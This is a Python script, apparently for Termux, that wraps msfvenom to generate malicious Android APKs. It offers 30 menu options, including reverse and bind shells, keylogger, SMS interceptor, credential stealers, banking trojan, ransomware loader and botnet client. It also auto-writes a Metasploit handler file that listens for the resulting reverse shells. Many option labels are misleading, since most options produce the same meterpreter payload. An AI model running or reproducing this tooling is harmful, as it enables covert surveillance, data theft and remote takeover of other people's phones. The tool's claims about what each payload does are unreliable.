#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║                   ANDROID SECURITY TOOL                  ║
    ║                 Mobile Assessment Framework             ║
    ║                     [Version 2.3.1]                     ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

def check_requirements():
    """Verifica se as dependências estão instaladas"""
    required_tools = ['msfvenom', 'msfconsole']
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run([tool, '--version'], capture_output=True, check=True)
        except:
            missing_tools.append(tool)
    
    return missing_tools

def show_menu():
    """Exibe o menu principal"""
    print("\n" + "="*60)
    print("           MOBILE SECURITY ASSESSMENT TOOLS")
    print("="*60)
    
    payloads = [
        "[1] Android Reverse TCP Shell",
        "[2] Android Reverse HTTP Shell", 
        "[3] Android Reverse HTTPS Shell",
        "[4] Android Bind TCP Shell",
        "[5] Android Meterpreter Reverse TCP",
        "[6] Android Meterpreter Reverse HTTP",
        "[7] Android Meterpreter Reverse HTTPS",
        "[8] Android Shell Reverse TCP",
        "[9] Android Shell Bind TCP",
        "[10] Android Debug Bridge Backdoor",
        "[11] Android Video Surveillance Payload",
        "[12] Android Audio Recording Payload",
        "[13] Android Location Tracker",
        "[14] Android SMS Interceptor",
        "[15] Android Call Log Stealer",
        "[16] Android Contact List Stealer",
        "[17] Android File Explorer Payload",
        "[18] Android Camera Controller",
        "[19] Android Keylogger Payload",
        "[20] Android Clipboard Monitor",
        "[21] Android Browser Data Stealer",
        "[22] Android Social Media Access",
        "[23] Android WiFi Credential Stealer",
        "[24] Android Persistent Backdoor",
        "[25] Android Root Exploit Loader",
        "[26] Android Banking Trojan",
        "[27] Android Ransomware Loader",
        "[28] Android Botnet Client",
        "[29] Android Crypto Miner",
        "[30] Android Custom Exploit"
    ]
    
    # Mostrar 10 opções por vez
    for i in range(0, 30, 10):
        for j in range(i, min(i+10, 30)):
            print(payloads[j])
        if i < 20:
            input("\nPressione Enter para ver mais opções...")
            clear_screen()
            print_banner()
    
    print("\n[0] Sair")
    print("="*60)

def get_payload_config(payload_type):
    """Obtém configuração do payload"""
    print(f"\nConfigurando Payload Tipo {payload_type}")
    print("-" * 40)
    
    lhost = input("IP do servidor (LHOST): ").strip()
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    output_name = input("Nome do arquivo de saída: ").strip()
    
    if not output_name.endswith('.apk'):
        output_name += '.apk'
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera o payload usando msfvenom"""
    
    payload_configs = {
        1: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Reverse TCP Shell básico para Android'
        },
        2: {
            'name': 'android/meterpreter/reverse_http', 
            'description': 'Reverse HTTP Shell para Android'
        },
        3: {
            'name': 'android/meterpreter/reverse_https',
            'description': 'Reverse HTTPS Shell criptografado'
        },
        4: {
            'name': 'android/meterpreter/bind_tcp',
            'description': 'Bind TCP Shell para Android'
        },
        5: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Meterpreter Reverse TCP'
        },
        6: {
            'name': 'android/meterpreter/reverse_http',
            'description': 'Meterpreter Reverse HTTP'
        },
        7: {
            'name': 'android/meterpreter/reverse_https', 
            'description': 'Meterpreter Reverse HTTPS'
        },
        8: {
            'name': 'android/shell/reverse_tcp',
            'description': 'Shell Reverse TCP simples'
        },
        9: {
            'name': 'android/shell/bind_tcp',
            'description': 'Shell Bind TCP'
        },
        10: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Backdoor via ADB'
        },
        11: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Payload de vigilância por vídeo'
        },
        12: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Gravador de áudio remoto'
        },
        13: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Rastreador de localização'
        },
        14: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Interceptador de SMS'
        },
        15: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Coletor de registros de chamadas'
        },
        16: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Coletor de lista de contatos'
        },
        17: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Explorador de arquivos remoto'
        },
        18: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Controlador de câmera'
        },
        19: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Keylogger para Android'
        },
        20: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Monitor de área de transferência'
        },
        21: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Coletor de dados do navegador'
        },
        22: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Acesso a redes sociais'
        },
        23: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Coletor de credenciais WiFi'
        },
        24: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Backdoor persistente'
        },
        25: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Carregador de exploits de root'
        },
        26: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Troyano bancário'
        },
        27: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Carregador de ransomware'
        },
        28: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Cliente de botnet'
        },
        29: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Minerador de criptomoeda'
        },
        30: {
            'name': 'android/meterpreter/reverse_tcp',
            'description': 'Exploit personalizado'
        }
    }
    
    config = payload_configs.get(payload_type)
    if not config:
        print("Tipo de payload inválido!")
        return False
    
    print(f"\nGerando: {config['description']}")
    print("Aguarde, isso pode levar alguns minutos...")
    
    try:
        # Comando msfvenom base
        cmd = [
            'msfvenom',
            '-p', config['name'],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-o', output_name
        ]
        
        # Adicionar opções específicas baseadas no tipo
        if payload_type in [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23]:
            cmd.extend(['--platform', 'android'])
        
        if payload_type == 24:  # Persistente
            cmd.extend(['-f', 'apk'])
            
        if payload_type == 25:  # Root exploit
            cmd.extend(['--arch', 'dalvik'])
            
        if payload_type in [26, 27, 28, 29]:  # Malwares avançados
            cmd.extend(['-f', 'raw'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
        
        # Executar comando
        print(f"Executando: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n✅ Payload gerado com sucesso: {output_name}")
            
            # Gerar handler automaticamente
            if generate_handler(payload_type, lhost, lport, output_name):
                print("✅ Handler configurado automaticamente")
            
            return True
        else:
            print(f"\n❌ Erro ao gerar payload: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"\n❌ Erro: {str(e)}")
        return False

def generate_handler(payload_type, lhost, lport, output_name):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {output_name}
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript multi_console_command -rc /opt/scripts/autorun.rc
exploit -j -z
"""
    
    handler_file = f"handler_{output_name.replace('.apk', '')}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        print(f"📁 Handler salvo como: {handler_file}")
        print("Execute com: msfconsole -r " + handler_file)
        return True
    except Exception as e:
        print(f"Erro ao criar handler: {str(e)}")
        return False

def show_payload_info(payload_type):
    """Mostra informações sobre o payload selecionado"""
    
    info_texts = {
        1: "Reverse TCP Shell - Conexão reversa básica via TCP",
        2: "Reverse HTTP Shell - Conexão via HTTP para bypass de firewall",
        3: "Reverse HTTPS Shell - Conexão criptografada HTTPS",
        4: "Bind TCP Shell - Abre porta no dispositivo alvo",
        5: "Meterpreter TCP - Shell avançado com múltiplas funções",
        6: "Meterpreter HTTP - Meterpreter via HTTP",
        7: "Meterpreter HTTPS - Meterpreter criptografado",
        8: "Shell TCP Simples - Shell básico sem meterpreter",
        9: "Bind TCP Simples - Shell bind básico",
        10: "ADB Backdoor - Backdoor via Android Debug Bridge",
        11: "Video Surveillance - Acesso à câmera do dispositivo",
        12: "Audio Recording - Gravação de áudio ambiente",
        13: "Location Tracker - Rastreamento GPS em tempo real",
        14: "SMS Interceptor - Interceptação e leitura de SMS",
        15: "Call Log Stealer - Coleta registros de chamadas",
        16: "Contact Stealer - Rouba lista de contatos",
        17: "File Explorer - Navegação remota em arquivos",
        18: "Camera Controller - Controle remoto de câmeras",
        19: "Keylogger - Captura de teclas digitadas",
        20: "Clipboard Monitor - Monitoramento da área de transferência",
        21: "Browser Data Stealer - Roubo de dados do navegador",
        22: "Social Media Access - Acesso a redes sociais",
        23: "WiFi Stealer - Roubo de credenciais WiFi",
        24: "Persistent Backdoor - Backdoor de reinicialização",
        25: "Root Exploit - Tentativa de escalação de privilégios",
        26: "Banking Trojan - Troyano focado em apps bancários",
        27: "Ransomware Loader - Carregador de ransomware",
        28: "Botnet Client - Cliente para rede de bots",
        29: "Crypto Miner - Minerador de criptomoedas",
        30: "Custom Exploit - Exploit personalizado avançado"
    }
    
    info = info_texts.get(payload_type, "Informação não disponível")
    print(f"\n📋 Informações do Payload {payload_type}:")
    print(f"   {info}")

def main():
    """Função principal"""
    
    # Verificar dependências
    missing_tools = check_requirements()
    if missing_tools:
        print("❌ Ferramentas necessárias não encontradas:")
        for tool in missing_tools:
            print(f"   - {tool}")
        print("\nInstale com: pkg install metasploit")
        return
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nSelecione uma opção [0-30]: ").strip()
            
            if choice == '0':
                print("\nSaindo...")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 30:
                show_payload_info(payload_type)
                
                if input("\nContinuar com este payload? (s/n): ").lower() == 's':
                    lhost, lport, output_name = get_payload_config(payload_type)
                    
                    if lhost and output_name:
                        print("\n🚀 Iniciando geração do payload...")
                        success = generate_payload(payload_type, lhost, lport, output_name)
                        
                        if success:
                            print("\n🎯 Payload criado com sucesso!")
                            print(f"📁 Arquivo: {output_name}")
                            print("⚠️  Use apenas para testes legais e autorizados!")
                        else:
                            print("\n💥 Falha na geração do payload!")
                    
                    input("\nPressione Enter para continuar...")
            
            else:
                print("❌ Opção inválida!")
                input("Pressione Enter para continuar...")
                
        except ValueError:
            print("❌ Por favor, digite um número válido!")
            input("Pressione Enter para continuar...")
        except KeyboardInterrupt:
            print("\n\nSaindo...")
            break

if __name__ == "__main__":
    main()
